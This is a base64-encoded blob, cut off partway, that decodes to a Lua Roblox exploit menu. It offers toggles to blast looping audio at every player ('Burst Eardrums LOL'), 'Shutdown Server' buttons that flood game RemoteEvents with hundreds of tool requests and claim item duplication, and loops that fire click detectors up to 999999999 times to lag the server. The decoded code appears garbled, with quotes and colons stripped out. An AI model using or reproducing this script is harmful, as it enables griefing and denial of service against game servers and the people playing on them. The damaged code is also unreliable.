VGFiQWRkRHJvcGRvd24oewogICAgTmFtZSA9IFNlbGVjdCBBdWRpbywKICAgIERlc2NyaXB0aW9uID0gQ2hvb3NlIGFuIGF1ZGlvIGZyb20gdGhlIGxpc3QsCiAgICBPcHRpb25zID0gYXVkaW9OYW1lcywKICAgIERlZmF1bHQgPSBhdWRpb05hbWVzWzFdLAogICAgRmxhZyA9IHNlbGVjdGVkX2F1ZGlvLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICBmb3IgXywgYXVkaW8gaW4gaXBhaXJzKGF1ZGlvcykgZG8KICAgICAgICAgICAgaWYgYXVkaW8uTmFtZSA9PSB2YWx1ZSB0aGVuCiAgICAgICAgICAgICAgICBzZWxlY3RlZEF1ZGlvSUQgPSBhdWRpby5JRAogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIExvb3AgY29udHJvbApsb2NhbCBhdWRpb0xvb3AgPSBmYWxzZQoKLS0gTmV3IHNlY3Rpb24gZm9yIGF1ZGlvIGxvb3AKVGFiQWRkU2VjdGlvbih7QXVkaW8gTG9vcH0pCgotLSBGdW5jdGlvbiB0byBwbGF5IGF1ZGlvIHJlcGVhdGVkbHkKbG9jYWwgZnVuY3Rpb24gcGxheUxvb3BlZEF1ZGlvKCkKICAgIHdoaWxlIGF1ZGlvTG9vcCBkbwogICAgICAgIGlmIHNlbGVjdGVkQXVkaW9JRCB0aGVuCiAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgICAgICBbMV0gPSBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpLAogICAgICAgICAgICAgICAgWzJdID0gc2VsZWN0ZWRBdWRpb0lELAogICAgICAgICAgICAgICAgWzNdID0gMSwKICAgICAgICAgICAgfQogICAgICAgICAgICBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkuUkVGaW5kRmlyc3RDaGlsZCgxR3UxblNvdW5kMXMpRmlyZVNlcnZlcih1bnBhY2soYXJncykpCgogICAgICAgICAgICAtLSBDcmVhdGUgYW5kIHBsYXkgdGhlIGF1ZGlvCiAgICAgICAgICAgIGxvY2FsIHNvdW5kID0gSW5zdGFuY2UubmV3KFNvdW5kKQogICAgICAgICAgICBzb3VuZC5Tb3VuZElkID0gcmJ4YXNzZXRpZCAuLiBzZWxlY3RlZEF1ZGlvSUQKICAgICAgICAgICAgc291bmQuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgIHNvdW5kUGxheSgpCiAgICAgICAgZWxzZQogICAgICAgICAgICB3YXJuKE5vIGF1ZGlvIHNlbGVjdGVkISkKICAgICAgICBlbmQKCiAgICAgICAgdGFzay53YWl0KDAuNSkgLS0gU21hbGwgZGVsYXkgdG8gYXZvaWQgb3ZlcmxvYWQKICAgIGVuZAplbmQKCi0tIFRvZ2dsZSBmb3IgYXVkaW8gbG9vcApUYWJBZGRUb2dnbGUoewogICAgTmFtZSA9IExvb3AgUGxheSBBdWRpbywKICAgIERlc2NyaXB0aW9uID0gQWN0aXZhdGVzIHRoZSBhdWRpbyBsb29wLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgRmxhZyA9IGF1ZGlvX2xvb3AsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgIGF1ZGlvTG9vcCA9IHZhbHVlCiAgICAgICAgaWYgYXVkaW9Mb29wIHRoZW4KICAgICAgICAgICAgdGFzay5zcGF3bihwbGF5TG9vcGVkQXVkaW8pIC0tIFN0YXJ0IHRoZSBsb29wIGluIGEgbmV3IHRocmVhZAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBBZGQgYSBwYXJhZ3JhcGggYXMgYSBsYWJlbApUYWJBZGRQYXJhZ3JhcGgoe0luZm8sIExvb3AgYXVkaW8gcGxheWJhY2sgKEFsbCBwbGF5ZXJzIGluIHRoZSBzZXJ2ZXIgY2FuIGhlYXIpfSkKCi0tIEZ1bmN0aW9uIHRvIHBsYXkgbm9ybWFsIGF1ZGlvCmxvY2FsIGZ1bmN0aW9uIHBsYXlBdWRpbygpCiAgICBpZiBzZWxlY3RlZEF1ZGlvSUQgdGhlbgogICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgIFsxXSA9IGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSksCiAgICAgICAgICAgIFsyXSA9IHNlbGVjdGVkQXVkaW9JRCwKICAgICAgICAgICAgWzNdID0gMSwKICAgICAgICB9CiAgICAgICAgZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpLlJFRmluZEZpcnN0Q2hpbGQoMUd1MW5Tb3VuZDFzKUZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQoKICAgICAgICAtLSBDcmVhdGUgYW5kIHBsYXkgdGhlIGF1ZGlvCiAgICAgICAgbG9jYWwgc291bmQgPSBJbnN0YW5jZS5uZXcoU291bmQpCiAgICAgICAgc291bmQuU291bmRJZCA9IHJieGFzc2V0aWQgLi4gc2VsZWN0ZWRBdWRpb0lECiAgICAgICAgc291bmQuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgc291bmRQbGF5KCkKICAgIGVsc2UKICAgICAgICB3YXJuKE5vIGF1ZGlvIHNlbGVjdGVkISkKICAgIGVuZAplbmQKCi0tIE5ldyBzZWN0aW9uIGZvciBwbGF5aW5nIGF1ZGlvClRhYkFkZFNlY3Rpb24oe1BsYXkgQXVkaW99KQoKLS0gQnV0dG9uIHRvIHBsYXkgdGhlIGF1ZGlvClRhYkFkZEJ1dHRvbih7UGxheSBBdWRpbywgZnVuY3Rpb24oKQogICAgcGxheUF1ZGlvKCkKZW5kfSkKCmxvY2FsIFJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpCmxvY2FsIGF1ZGlvSUQgPSA2MzE0ODgwMTc0IC0tIEZpeGVkIGF1ZGlvIElECgpsb2NhbCBmdW5jdGlvbiBBdWRpb19BbGxfQ2xpZW50U2lkZShJRCkKICAgIGxvY2FsIGZ1bmN0aW9uIENoZWNrRm9sZGVyQXVkaW9BbGwoKQogICAgICAgIGxvY2FsIEZvbGRlckF1ZGlvID0gd29ya3NwYWNlRmluZEZpcnN0Q2hpbGQoQXVkaW8gYWxsIGNsaWVudCkKICAgICAgICBpZiBub3QgRm9sZGVyQXVkaW8gdGhlbgogICAgICAgICAgICBGb2xkZXJBdWRpbyA9IEluc3RhbmNlLm5ldyhGb2xkZXIpCiAgICAgICAgICAgIEZvbGRlckF1ZGlvLk5hbWUgPSBBdWRpbyBhbGwgY2xpZW50CiAgICAgICAgICAgIEZvbGRlckF1ZGlvLlBhcmVudCA9IHdvcmtzcGFjZQogICAgICAgIGVuZAogICAgICAgIHJldHVybiBGb2xkZXJBdWRpbwogICAgZW5kCgogICAgbG9jYWwgZnVuY3Rpb24gQ3JlYXRlU291bmQoSUQpCiAgICAgICAgaWYgdHlwZShJRCkgfj0gbnVtYmVyIHRoZW4KICAgICAgICAgICAgcHJpbnQoSW5zZXJ0IGEgdmFsaWQgbnVtYmVyISkKICAgICAgICAgICAgcmV0dXJuIG5pbAogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBGb2xkZXJfQXVkaW8gPSBDaGVja0ZvbGRlckF1ZGlvQWxsKCkKICAgICAgICBpZiBGb2xkZXJfQXVkaW8gdGhlbgogICAgICAgICAgICBsb2NhbCBTb3VuZCA9IEluc3RhbmNlLm5ldyhTb3VuZCkKICAgICAgICAgICAgU291bmQuU291bmRJZCA9IHJieGFzc2V0aWQgLi4gSUQKICAgICAgICAgICAgU291bmQuVm9sdW1lID0gMQogICAgICAgICAgICBTb3VuZC5Mb29wZWQgPSBmYWxzZQogICAgICAgICAgICBTb3VuZC5QYXJlbnQgPSBGb2xkZXJfQXVkaW8KICAgICAgICAgICAgU291bmRQbGF5KCkKICAgICAgICAgICAgdGFzay53YWl0KDEpIC0tIFdhaXQgdGltZSBiZWZvcmUgcmVtb3ZpbmcgdGhlIHNvdW5kCiAgICAgICAgICAgIFNvdW5kRGVzdHJveSgpCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBDcmVhdGVTb3VuZChJRCkKZW5kCgpsb2NhbCBmdW5jdGlvbiBBdWRpb19BbGxfU2VydmVyU2lkZShJRCkKICAgIGlmIHR5cGUoSUQpIH49IG51bWJlciB0aGVuCiAgICAgICAgcHJpbnQoSW5zZXJ0IGEgdmFsaWQgbnVtYmVyISkKICAgICAgICByZXR1cm4gbmlsCiAgICBlbmQKCiAgICBsb2NhbCBHdW5Tb3VuZEV2ZW50ID0gUmVwbGljYXRlZFN0b3JhZ2VGaW5kRmlyc3RDaGlsZCgxR3UxblNvdW5kMXMsIHRydWUpCiAgICBpZiBHdW5Tb3VuZEV2ZW50IHRoZW4KICAgICAgICBHdW5Tb3VuZEV2ZW50RmlyZVNlcnZlcih3b3Jrc3BhY2UsIElELCAxKQogICAgZW5kCmVuZAoKLS0gVG9nZ2xlIGZvciBCdXJzdCBldmVyeW9uZSdzIGVhcmRydW1zClRhYkFkZFRvZ2dsZSh7CiAgICBOYW1lID0gQnVyc3QgRWFyZHJ1bXMgTE9MLAogICAgRGVzY3JpcHRpb24gPSBQbGF5cyBhdWRpbyByZXBlYXRlZGx5IGZvciBldmVyeW9uZSwKICAgIERlZmF1bHQgPSBmYWxzZSwKICAgIEZsYWcgPSBhdWRpb19zcGFtLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICBnZXRnZW52KCkuQXVkaW9fQWxsX2xvb3BfZmFzdCA9IHZhbHVlCgogICAgICAgIHdoaWxlIGdldGdlbnYoKS5BdWRpb19BbGxfbG9vcF9mYXN0IGRvCiAgICAgICAgICAgIEF1ZGlvX0FsbF9TZXJ2ZXJTaWRlKGF1ZGlvSUQpCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgQXVkaW9fQWxsX0NsaWVudFNpZGUoYXVkaW9JRCkKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICB0YXNrLndhaXQoMC4wMykgLS0gRXh0cmVtZWx5IGZhc3QgZGVsYXkgKDAuMDMgc2Vjb25kcykKICAgICAgICBlbmQKICAgIGVuZAp9KQoKVGFiQWRkUGFyYWdyYXBoKHtJbmZvLCBFdmVyeW9uZSBpbiB0aGUgc2VydmVyIGhlYXJzIHRoZSBhdWRpb30pCgoKbG9jYWwgVGFiID0gV2luZG93TWFrZVRhYih7TGFnIFNlcnZlciwgYm9tYn0pCgoKLS0gU2h1dGRvd24gQ3VzdG9tIFNlY3Rpb24KbG9jYWwgU2VjdGlvbiA9IFRhYkFkZFNlY3Rpb24oewogICAgTmFtZSA9IEN1c3RvbSBTaHV0ZG93bgp9KQoKLS0gU2h1dGRvd24gU2VydmVyIEJ1dHRvbgpUYWJBZGRCdXR0b24oewogICAgTmFtZSA9IFNodXRkb3duIFNlcnZlciwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGZvciBtID0gMSwgNDk1IGRvCiAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgICAgICBbMV0gPSBQaWNraW5nVG9vbHMsCiAgICAgICAgICAgICAgICBbMl0gPSBGaXJlSG9zZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKS5SRUZpbmRGaXJzdENoaWxkKDFUb28xbClJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgWzFdID0gRmlyZUhvc2UsCiAgICAgICAgICAgICAgICBbMl0gPSBEZXN0cm95RmlyZUhvc2UKICAgICAgICAgICAgfQogICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5CYWNrcGFjay5GaXJlSG9zZS5Ub29sU291bmRGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICBlbmQKICAgICAgICBsb2NhbCBvbGRjZiA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDc1LCA5OTk5OTk5OTkuNDE0KQogICAgICAgIGxvY2FsIHJvb3RwYXJ0ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgcmVwZWF0IHdhaXQoKSB1bnRpbCByb290cGFydC5QYXJlbnQgPT0gbmlsCiAgICAgICAgcmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gb2xkY2YKICAgICAgICBnYW1lR2V0U2VydmljZShTdGFydGVyR3VpKVNldENvcmUoU2VuZE5vdGlmaWNhdGlvbiwgewogICAgICAgICAgICBUaXRsZSA9IER1cGUgU2NyaXB0LAogICAgICAgICAgICBUZXh0ID0gU2h1dGRvd24gQ29tcGxldGUsIE5vdyBJdCBXaWxsIFNodXQgRG93biwKICAgICAgICAgICAgQnV0dG9uMSA9IE9rLAogICAgICAgICAgICBEdXJhdGlvbiA9IDUKICAgICAgICB9KQogICAgICAgIHdhaXQoKQogICAgICAgIGZvciBfLCBlcmdlZyBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiBlcmdlZy5OYW1lID09IEZpcmVIb3NlIHRoZW4KICAgICAgICAgICAgICAgIGVyZ2VnLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgd2FpdCgwLjIpCiAgICAgICAgZ2FtZUdldFNlcnZpY2UoU3RhcnRlckd1aSlTZXRDb3JlKFNlbmROb3RpZmljYXRpb24sIHsKICAgICAgICAgICAgVGl0bGUgPSBEdXBlIFNjcmlwdCwKICAgICAgICAgICAgVGV4dCA9IFN0YXJ0aW5nIGR1cGxpY2F0aW9uLCBiZSBwYXRpZW50LAogICAgICAgICAgICBCdXR0b24xID0gT2ssCiAgICAgICAgICAgIER1cmF0aW9uID0gNQogICAgICAgIH0pCiAgICAgICAgd2FpdCgwLjUpCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoOTk5OSwgLTQ3NSwgOTk5OSkKICAgIGVuZAp9KQoKLS0gU2h1dGRvd24gU2VydmVyIChJbnRlcm5ldCBFcnJvcikgQnV0dG9uClRhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gU2h1dGRvd24gU2VydmVyIChJbnRlcm5ldCBFcnJvciksCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBmb3IgbSA9IDEsIDUzNSBkbwogICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgWzFdID0gUGlja2luZ1Rvb2xzLAogICAgICAgICAgICAgICAgWzJdID0gRmlyZUhvc2UKICAgICAgICAgICAgfQogICAgICAgICAgICBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkuUkVGaW5kRmlyc3RDaGlsZCgxVG9vMWwpSW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgIFsxXSA9IEZpcmVIb3NlLAogICAgICAgICAgICAgICAgWzJdID0gRGVzdHJveUZpcmVIb3NlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2suRmlyZUhvc2UuVG9vbFNvdW5kRmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgZW5kCiAgICAgICAgbG9jYWwgb2xkY2YgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoOTk5OTk5OTk5LjQxNCwgLTQ3NSwgOTk5OTk5OTk5LjQxNCkKICAgICAgICBsb2NhbCByb290cGFydCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAogICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgcm9vdHBhcnQuUGFyZW50ID09IG5pbAogICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IG9sZGNmCiAgICAgICAgZ2FtZUdldFNlcnZpY2UoU3RhcnRlckd1aSlTZXRDb3JlKFNlbmROb3RpZmljYXRpb24sIHsKICAgICAgICAgICAgVGl0bGUgPSBEdXBlIFNjcmlwdCwKICAgICAgICAgICAgVGV4dCA9IFNodXRkb3duIENvbXBsZXRlLCBOb3cgSXQgV2lsbCBTaHV0IERvd24sCiAgICAgICAgICAgIEJ1dHRvbjEgPSBPaywKICAgICAgICAgICAgRHVyYXRpb24gPSA1CiAgICAgICAgfSkKICAgICAgICB3YWl0KCkKICAgICAgICBmb3IgXywgZXJnZWcgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgZXJnZWcuTmFtZSA9PSBGaXJlSG9zZSB0aGVuCiAgICAgICAgICAgICAgICBlcmdlZy5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHdhaXQoMC4yKQogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFN0YXJ0ZXJHdWkpU2V0Q29yZShTZW5kTm90aWZpY2F0aW9uLCB7CiAgICAgICAgICAgIFRpdGxlID0gRHVwZSBTY3JpcHQsCiAgICAgICAgICAgIFRleHQgPSBTdGFydGluZyBkdXBsaWNhdGlvbiwgYmUgcGF0aWVudCwKICAgICAgICAgICAgQnV0dG9uMSA9IE9rLAogICAgICAgICAgICBEdXJhdGlvbiA9IDUKICAgICAgICB9KQogICAgICAgIHdhaXQoMC41KQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDk5OTksIC00NzUsIDk5OTkpCiAgICBlbmQKfSkKCi0tIFNodXRkb3duIFNlcnZlciAoVGltZW91dCBFcnJvcikgQnV0dG9uClRhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gU2h1dGRvd24gU2VydmVyIChDb25uZWN0aW9uIFRpbWVvdXQgRXJyb3IpLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgZm9yIG0gPSAxLCA2MzUgZG8KICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgIFsxXSA9IFBpY2tpbmdUb29scywKICAgICAgICAgICAgICAgIFsyXSA9IEZpcmVIb3NlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpLlJFRmluZEZpcnN0Q2hpbGQoMVRvbzFsKUludm9rZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgICAgICBbMV0gPSBGaXJlSG9zZSwKICAgICAgICAgICAgICAgIFsyXSA9IERlc3Ryb3lGaXJlSG9zZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkJhY2twYWNrLkZpcmVIb3NlLlRvb2xTb3VuZEZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgIGVuZAogICAgICAgIGxvY2FsIG9sZGNmID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBvbGRjZgogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFN0YXJ0ZXJHdWkpU2V0Q29yZShTZW5kTm90aWZpY2F0aW9uLCB7CiAgICAgICAgICAgIFRpdGxlID0gRHVwZSBTY3JpcHQsCiAgICAgICAgICAgIFRleHQgPSBTaHV0ZG93biBDb21wbGV0ZSwgTm93IEl0IFdpbGwgU2h1dCBEb3duLAogICAgICAgICAgICBCdXR0b24xID0gT2ssCiAgICAgICAgICAgIER1cmF0aW9uID0gNQogICAgICAgIH0pCiAgICAgICAgd2FpdCgpCiAgICAgICAgZm9yIF8sIGVyZ2VnIGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja0dldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIGVyZ2VnLk5hbWUgPT0gRmlyZUhvc2UgdGhlbgogICAgICAgICAgICAgICAgZXJnZWcuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICB3YWl0KDAuMikKICAgICAgICBnYW1lR2V0U2VydmljZShTdGFydGVyR3VpKVNldENvcmUoU2VuZE5vdGlmaWNhdGlvbiwgewogICAgICAgICAgICBUaXRsZSA9IER1cGUgU2NyaXB0LAogICAgICAgICAgICBUZXh0ID0gU3RhcnRpbmcgZHVwbGljYXRpb24sIGJlIHBhdGllbnQsCiAgICAgICAgICAgIEJ1dHRvbjEgPSBPaywKICAgICAgICAgICAgRHVyYXRpb24gPSA1CiAgICAgICAgfSkKICAgICAgICB3YWl0KDAuNSkKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5LCAtNDc1LCA5OTk5KQogICAgZW5kCn0pCgotLSBMYWcgTGFwdG9wIFNlY3Rpb24KbG9jYWwgU2VjdGlvbiA9IFRhYkFkZFNlY3Rpb24oewogICAgTmFtZSA9IExhZyB3aXRoIExhcHRvcAp9KQoKLS0gVG9nZ2xlIFN0YXRlIGZvciBMYWcgTGFwdG9wCmxvY2FsIHRvZ2dsZXMgPSB7IExhZ0xhcHRvcCA9IGZhbHNlIH0KCi0tIEZ1bmN0aW9uIHRvIFNpbXVsYXRlIE5vcm1hbCBDbGljawpsb2NhbCBmdW5jdGlvbiBjbGlja05vcm1hbGx5KG9iamVjdCkKICAgIGxvY2FsIGNsaWNrRGV0ZWN0b3IgPSBvYmplY3RGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKENsaWNrRGV0ZWN0b3IpCiAgICBpZiBjbGlja0RldGVjdG9yIHRoZW4KICAgICAgICBmaXJlY2xpY2tkZXRlY3RvcihjbGlja0RldGVjdG9yKQogICAgZW5kCmVuZAoKLS0gRnVuY3Rpb24gdG8gTGFnIEdhbWUgd2l0aCBMYXB0b3AKbG9jYWwgZnVuY3Rpb24gbGFnR2FtZVdpdGhMYXB0b3AobGFwdG9wUGF0aCwgbWF4VGVsZXBvcnRzKQogICAgaWYgbGFwdG9wUGF0aCB0aGVuCiAgICAgICAgbG9jYWwgdGVsZXBvcnRDb3VudCA9IDAKICAgICAgICB3aGlsZSB0ZWxlcG9ydENvdW50ICBtYXhUZWxlcG9ydHMgYW5kIHRvZ2dsZXMuTGFnTGFwdG9wIGRvCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBsYXB0b3BQYXRoLkNGcmFtZQogICAgICAgICAgICBjbGlja05vcm1hbGx5KGxhcHRvcFBhdGgpCiAgICAgICAgICAgIHRlbGVwb3J0Q291bnQgPSB0ZWxlcG9ydENvdW50ICsgMQogICAgICAgICAgICB3YWl0KDAuMDAwMSkKICAgICAgICBlbmQKICAgIGVsc2UKICAgICAgICB3YXJuKExhcHRvcCBub3QgZm91bmQuKQogICAgZW5kCmVuZAoKLS0gTGFnIExhcHRvcCBUb2dnbGUKVGFiQWRkVG9nZ2xlKHsKICAgIE5hbWUgPSBMYWcgd2l0aCBMYXB0b3AsCiAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIHRvZ2dsZXMuTGFnTGFwdG9wID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgICAgIGxvY2FsIGxhcHRvcFBhdGggPSB3b3Jrc3BhY2VGaW5kRmlyc3RDaGlsZChXb3Jrc3BhY2VDb20pRmluZEZpcnN0Q2hpbGQoMDAxX0dpdmVUb29scylGaW5kRmlyc3RDaGlsZChMYXB0b3ApCiAgICAgICAgICAgIGlmIGxhcHRvcFBhdGggdGhlbgogICAgICAgICAgICAgICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGxhZ0dhbWVXaXRoTGFwdG9wKGxhcHRvcFBhdGgsIDk5OTk5OTk5OSkKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgd2FybihMYXB0b3Agbm90IGZvdW5kLikKICAgICAgICAgICAgZW5kCiAgICAgICAgZWxzZQogICAgICAgICAgICBwcmludChMYWcgd2l0aCBMYXB0b3AgZGVhY3RpdmF0ZWQuKQogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBMYWcgTGFwdG9wIFBhcmFncmFwaApUYWJBZGRQYXJhZ3JhcGgoewogICAgTGFnIEluZm9ybWF0aW9uLAogICAgVGhlIGxhZyBlZmZlY3Qgc3RhcnRzIGFmdGVyIDM1IHNlY29uZHMKfSkKCi0tIExhZyBQaG9uZSBTZWN0aW9uCmxvY2FsIFNlY3Rpb24gPSBUYWJBZGRTZWN0aW9uKHsKICAgIE5hbWUgPSBMYWcgd2l0aCBQaG9uZQp9KQoKLS0gVG9nZ2xlIFN0YXRlIGZvciBMYWcgUGhvbmUKdG9nZ2xlcy5MYWdQaG9uZSA9IGZhbHNlCgotLSBGdW5jdGlvbiB0byBMYWcgR2FtZSB3aXRoIFBob25lCmxvY2FsIGZ1bmN0aW9uIGxhZ0dhbWVXaXRoUGhvbmUocGhvbmVQYXRoLCBtYXhUZWxlcG9ydHMpCiAgICBpZiBwaG9uZVBhdGggdGhlbgogICAgICAgIGxvY2FsIHRlbGVwb3J0Q291bnQgPSAwCiAgICAgICAgd2hpbGUgdGVsZXBvcnRDb3VudCAgbWF4VGVsZXBvcnRzIGFuZCB0b2dnbGVzLkxhZ1Bob25lIGRvCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBwaG9uZVBhdGguQ0ZyYW1lCiAgICAgICAgICAgIGNsaWNrTm9ybWFsbHkocGhvbmVQYXRoKQogICAgICAgICAgICB0ZWxlcG9ydENvdW50ID0gdGVsZXBvcnRDb3VudCArIDEKICAgICAgICAgICAgd2FpdCgwLjAxKQogICAgICAgIGVuZAogICAgZWxzZQogICAgICAgIHdhcm4oUGhvbmUgbm90IGZvdW5kLikKICAgIGVuZAplbmQKCi0tIExhZyBQaG9uZSBUb2dnbGUKVGFiQWRkVG9nZ2xlKHsKICAgIE5hbWUgPSBMYWcgd2l0aCBQaG9uZSwKICAgIERlZmF1bHQgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb